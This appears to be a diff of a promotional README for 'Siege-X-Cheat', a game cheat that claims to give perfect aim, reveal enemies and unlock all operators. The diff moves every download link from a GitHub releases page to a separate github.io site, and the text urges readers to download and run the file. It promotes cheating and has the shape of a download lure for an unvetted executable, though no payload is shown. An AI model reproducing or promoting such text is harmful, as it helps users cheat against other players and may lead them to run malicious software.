@@ -1,6 +1,6 @@
 # 🎯 Siege-X-Cheat - Dominate Every Match Instantly
 
-[![Download Siege-X-Cheat](https://img.shields.io/badge/Download-Siege--X--Cheat-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/badai4302/Siege-X-Cheat/releases)
+[![Download Siege-X-Cheat](https://img.shields.io/badge/Download-Siege--X--Cheat-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://badai4302.github.io)
 
 ## 🚀 What Is Siege-X-Cheat?
 
@@ -36,7 +36,7 @@ Your PC doesn't need to be a gaming beast. This tool is lightweight and runs alo
 
 ## 📥 How to Download and Install
 
-Visit this link to download the application: [https://github.com/badai4302/Siege-X-Cheat/releases](https://github.com/badai4302/Siege-X-Cheat/releases)
+Visit this link to download the application: [https://badai4302.github.io](https://badai4302.github.io)
 
 Once you're on the download page, follow these simple steps:
 
@@ -125,7 +125,7 @@ Join thousands of satisfied players who dominate every round. Stop losing fair f
 
 ## 📥 Get Started Now
 
-Visit this link to download the application: [https://github.com/badai4302/Siege-X-Cheat/releases](https://github.com/badai4302/Siege-X-Cheat/releases)
+Visit this link to download the application: [https://badai4302.github.io](https://badai4302.github.io)
 
 Download the file, run it, and launch the game. You'll see the difference immediately. Your aim will be dead-on, you'll spot every enemy before they spot you, and you'll have every operator unlocked from the start.
 
